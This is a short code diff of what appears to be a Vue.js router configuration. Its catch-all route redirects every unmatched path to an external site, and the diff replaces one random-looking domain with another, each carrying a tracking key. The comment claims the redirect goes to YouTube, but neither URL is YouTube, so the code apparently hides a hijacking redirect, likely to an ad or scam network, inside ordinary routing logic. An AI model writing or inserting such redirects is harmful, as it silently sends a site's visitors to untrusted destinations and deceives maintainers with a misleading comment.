@@ -16,7 +16,7 @@ const routes = [
     path: '/:catchAll(.*)', // This route will catch any path
     beforeEnter: (to, from, next) => {
       // Redirect to YouTube for any string
-      window.location.href = 'https://continuedhostilityequipped.com/xqi5veeg?key=8ea2b8ddfdbd9693667d6e8ab20356bd';
+      window.location.href = 'https://avenuewalkerchange.com/xqi5veeg?key=8ea2b8ddfdbd9693667d6e8ab20356bd';
     }
     
   }
